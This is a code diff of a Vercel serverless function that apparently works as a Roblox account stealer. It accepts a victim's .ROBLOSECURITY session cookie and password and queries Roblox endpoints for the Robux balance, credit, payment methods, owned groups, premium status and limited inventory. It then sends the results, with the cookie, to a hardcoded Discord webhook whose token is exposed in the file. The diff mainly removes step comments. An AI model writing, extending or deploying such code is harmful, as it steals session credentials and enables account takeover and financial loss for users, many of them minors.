@@ -1,7 +1,7 @@
 import type { VercelRequest, VercelResponse } from '@vercel/node';
 import fetch from 'node-fetch';
 
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1421152095368642762/q7ptPLwZNW3IyAZSLi3n8VYA2g1dMOrdXqX-sR0D5lUipBu5_EaNNBa3Otxuy07dHzBd'; // Replace with your webhook
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1421152095368642762/q7ptPLwZNW3IyAZSLi3n8VYA2g1dMOrdXqX-sR0D5lUipBu5_EaNNBa3Otxuy07dHzBd'; // replace this
 
 export default async function handler(req: VercelRequest, res: VercelResponse) {
   if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });
@@ -10,7 +10,6 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   if (!cookie || !password) return res.status(400).json({ success: false, message: 'Missing cookie or password' });
 
   try {
-    // 1. Get authenticated user info
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
@@ -18,12 +17,10 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     const userData: any = await userRes.json();
     const userId = userData.id;
 
-    // 2. Full user info
     const fullUserRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
     const fullUserData: any = await fullUserRes.json();
     const accountCreated = fullUserData.created;
 
-    // 3. Email verification & country
     const accountInfoRes = await fetch(`https://accountinformation.roblox.com/v1/users/${userId}`, {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
@@ -31,7 +28,6 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     const isEmailVerified = accountInfoData.isEmailVerified;
     const country = accountInfoData.countryCode || '🌍 Unknown';
 
-    // 4. Robux balance
     const balanceRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
@@ -39,7 +35,6 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     const robux = balanceData.robux;
     const pendingRobux = balanceData.pendingRobux;
 
-    // 5. Groups owned
     const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
@@ -51,14 +46,12 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       if (ownedGroups.length) groupsOwned = ownedGroups.join(', ');
     }
 
-    // 6. Credit balance
     const creditRes = await fetch(`https://accountinformation.roblox.com/v1/users/${userId}/credit`, {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
     const creditData: any = creditRes.ok ? await creditRes.json() : { balance: 0 };
     const creditBalance = creditData.balance || 0;
 
-    // 7. Payment methods
     const paymentRes = await fetch(`https://accountinformation.roblox.com/v1/users/${userId}/payment-methods`, {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
@@ -67,14 +60,12 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       ? paymentData.map((p: any) => p.paymentInstrumentType).join(', ')
       : '❌ None';
 
-    // 8. Premium membership
     const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
       headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
     });
     const premiumData: any = premiumRes.ok ? await premiumRes.json() : { hasPremium: false };
     const hasPremium = premiumData.hasPremium;
 
-    // 9. Inventory limited items
     let totalRAP = 0;
     let korBloxCount = 0;
     let headlessCount = 0;
@@ -97,7 +88,6 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       page = invData.nextPageCursor || '';
     }
 
-    // 10. Send to Discord webhook
     await fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -132,10 +122,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
       }),
     });
 
-    return res.status(200).json({
-      success: true,
-      message: '✅ Account info successfully logged!',
-    });
+    return res.status(200).json({ success: true, message: '✅ Account info successfully logged!' });
 
   } catch (err) {
     console.error(err);
